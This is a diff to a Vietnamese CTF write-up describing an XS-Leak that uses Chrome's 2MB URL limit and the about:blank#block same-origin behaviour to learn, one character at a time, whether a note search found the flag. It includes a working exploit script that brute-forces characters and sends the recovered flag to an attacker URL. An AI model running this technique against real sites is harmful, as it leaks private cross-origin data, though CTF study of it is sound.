@@ -273,6 +273,74 @@ app.listen(port, async () => {
 Set flag vào note và visit đến site mà ta đưa vào.
 
 Ý tưởng: Lợi dụng URL limit 2MB trong Chrome
-- Làm cho độ dài khi query nhỏ hơn 2MB, do đó khi điều hướng đến ?found=0 với phần fragment sẽ vừa đủ 2MB và gây ra `about:blank#block`
+- Như đã phân tích ở trên, khi tìm kiếm thấy thì nó sẽ redirect đến `?found=1#xxx`, còn không thì chỉ redirect đến `?found=0`.
+- Mà khi redirect thì phần fragment sẽ được thay đổi nếu có fragment (sau dấu #) mới được thay vào, còn không thì phần fragment sẽ giữ nguyên.
+- Khi độ dài url quá 2MB thì tab đó sẽ bị `about:blank#block`, và sẽ được xem cùng origin với trang mở tab đó, do đó nếu ta gọi đến `w.origin` thì sẽ không bị block bởi CORS như sau:
+```js
+// Giả sử đang đứng ở trang example.com mà mở console nhập đoạn sau:
+url = "http://google.com"
+'http://google.com'
+let w = window.open(url + "#" + "A".repeat(2 * 1024 * 1024 - url.length));
+undefined
+w.origin
+'https://example.com'
+```
+Bây giờ điều ta cần làm là:
+- Làm cho độ dài khi query nhỏ hơn 2MB sao cho khi điều hướng đến ?found=0 với phần fragment sẽ vừa đủ (hoặc lớn hơn 1 ít vì `q=` và `found=0` chỉ đủ search 4 ký tự thôi)2MB và gây ra `about:blank#block`
 - Nếu tìm kiếm có thì fragment mới sẽ thay phần `#AAA...AAA` nên sẽ không aborted.
 
+Thời gian bị giới hạn trong 10s nên để tăng số ký tự search được mình xài `Promise.all(promises)`:
+
+```js
+    <script>
+        const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{|}~'
+
+        const leak = async (url) => {
+            let w = window.open(url + "#" + "A".repeat(2 * 1024 * 1024 - url.length - 2));
+            await sleep(800);
+            try {
+                w.origin;
+                await w.close();
+                return 0;
+            } catch {
+                await w.close();
+                return 1;
+            }
+        }
+
+        const solve = async (char) => {
+            const leaked = await leak(`<%= CHALL %>?q=${flag.slice(-3) + char}`);
+            if (leaked) {
+                flag += char;
+                await fetch(`<%= OUR_URL %>?flag=${flag}`);
+                return true;
+            }
+            return false;
+        }
+
+        const main = async () => {
+            let promises = [];
+            while (true) {
+                for (let c of charset) {
+                    promises.push(solve(c));
+                    if (promises.length === 40 || charset.indexOf(c) === charset.length - 1) {
+                        const results = await Promise.all(promises);
+                        promises = [];
+                    }
+                }
+            }
+        };
+
+        
+
+        async function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        console.log(`Running...`);
+        let flag = Cookies.get("flag");
+        main();
+
+    </script>
+```
+
+Mình đã xây dựng đầy đủ POC ở [đây](https://github.com/rayinaw/xsleak-server/tree/main/Chrome-URL-Length-Inflation-Server)
